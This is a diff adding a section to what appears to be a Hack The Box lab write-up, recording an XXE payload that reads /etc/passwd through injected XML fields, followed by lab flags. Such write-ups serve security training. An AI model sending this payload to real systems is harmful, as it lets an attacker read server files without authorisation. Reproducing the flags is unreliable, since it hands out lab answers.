@@ -581,3 +581,19 @@ Table: company
 ```
 
 HTB{49f0bad299687c62334182178bfd75d8}
+
+## shopdev2.inlanefreight.local
+
+```xml
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE root [
+  <!ENTITY xxe SYSTEM "file:///etc/passwd">
+]>
+<root>
+    <subtotal>&xxe;</subtotal>
+    <userid>&xxe;</userid>
+</root>
+
+```
+
+HTB{dbca4dc5d99cdb3311404ea74921553c}
